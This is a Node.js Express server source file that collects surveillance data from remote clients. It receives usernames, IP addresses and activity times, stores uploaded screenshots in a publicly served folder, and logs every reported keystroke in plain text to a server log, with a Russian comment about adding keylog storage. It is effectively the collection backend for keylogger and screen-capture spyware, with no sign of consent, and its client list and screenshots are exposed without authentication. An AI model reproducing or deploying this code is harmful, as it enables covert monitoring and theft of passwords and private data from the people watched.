const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const port = 3000;

let clients = [];
let keyLogs = {}; // Добавление для хранения кейлогов

app.use(bodyParser.json());
app.use(express.static('public'));

function logMessage(message) {
    const logFile = path.join(__dirname, 'server.log');
    const timestamp = new Date().toISOString();
    fs.appendFileSync(logFile, `[${timestamp}] ${message}\n`);
}

// Route for receiving monitoring data
app.post('/api/monitor', (req, res) => {
    const { user, ip, lastActive } = req.body;
    logMessage(`Monitor data received: user=${user}, ip=${ip}, lastActive=${lastActive}`);

    const clientIndex = clients.findIndex(client => client.user === user);
    if (clientIndex === -1) {
        clients.push({ user, ip, lastActive, screenshots: [] });
    } else {
        clients[clientIndex].lastActive = lastActive;
    }

    res.sendStatus(200);
});

// Route for receiving screenshot
app.post('/api/screenshot', (req, res) => {
    const user = req.query.user;
    let timestamp = req.query.timestamp;
    const chunks = [];
    logMessage(`Receiving screenshot for user: ${user}`);

    timestamp = timestamp.replace(/:/g, '-');

    req.on('data', chunk => {
        chunks.push(chunk);
    });

    req.on('end', () => {
        const screenshotBuffer = Buffer.concat(chunks);
        const screenshotPath = path.join(__dirname, 'public', 'screenshots', `${user}_${timestamp}.jpeg`);
        logMessage(`Saving screenshot to: ${screenshotPath}`);

        const screenshotDir = path.dirname(screenshotPath);
        if (!fs.existsSync(screenshotDir)) {
            fs.mkdirSync(screenshotDir, { recursive: true });
        }

        try {
            fs.writeFileSync(screenshotPath, screenshotBuffer);
            logMessage(`Screenshot saved successfully.`);

            const clientIndex = clients.findIndex(client => client.user === user);
            if (clientIndex !== -1) {
                clients[clientIndex].screenshots.push(`${user}_${timestamp}.jpeg`);
            }

            res.sendStatus(200);
        } catch (error) {
            logMessage(`Error saving screenshot for user ${user}: ${error}`);
            res.sendStatus(500);
        }
    });
});

// Route for receiving keylog data
app.post('/api/keylog', (req, res) => {
    const { user, key } = req.body;
    logMessage(`Keylog received: user=${user}, key=${key}`);

    if (!keyLogs[user]) {
        keyLogs[user] = [];
    }

    keyLogs[user].push(key);

    res.sendStatus(200);
});

// Route for serving client data
app.get('/api/clients', (req, res) => {
    res.json(clients);
});

// Serve the main HTML file
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(port, () => {
    logMessage(`Server listening at http://localhost:${port}`);
});
